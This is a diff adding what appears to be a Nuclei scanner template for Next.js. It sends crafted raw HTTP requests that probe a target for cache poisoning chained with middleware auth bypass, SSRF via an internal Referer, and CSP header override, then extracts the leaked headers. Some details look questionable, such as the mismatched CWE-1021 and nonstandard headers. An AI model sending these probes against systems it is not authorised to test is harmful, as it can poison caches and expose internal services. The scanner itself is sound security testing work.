@@ -1,0 +1,56 @@
+id: nextjs-cache-chaining
+
+info:
+  name: Next.js Cache Poisoning + Chained Exploitation (Auth Bypass, SSRF, CSP override)
+  author: sethbdev
+  severity: critical
+  description: |
+    Attempts to chain Next.js cache poisoning with auth bypass, SSRF, or CSP header override.
+  tags: nextjs, cache-poisoning, auth-bypass, ssrf, csp, chain
+  metadata:
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    cwe-id: CWE-1021
+
+variables:
+  rand: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Middleware-Prefetch: 1
+        X-NextJS-Cache: bypass
+        Priority: h=5
+        Content-Type: application/json
+        Accept: */*
+        User-Agent: Mozilla/5.0
+
+        {"input":"{{rand}}"}
+
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Prefetch: true
+        Referer: http://internal.service
+        Content-Security-Policy: script-src 'unsafe-inline'
+        User-Agent: Mozilla/5.0
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-Middleware-Skip: 1"
+          - "Location: http://internal.service"
+          - "Content-Security-Policy: script-src 'unsafe-inline'"
+
+    extractors:
+      - type: regex
+        name: header-leak
+        part: header
+        regex:
+          - "X-Middleware-Skip:\\s?1"
+          - "Location:\\s?(.*)"
+          - "Content-Security-Policy:\\s?(.*)"
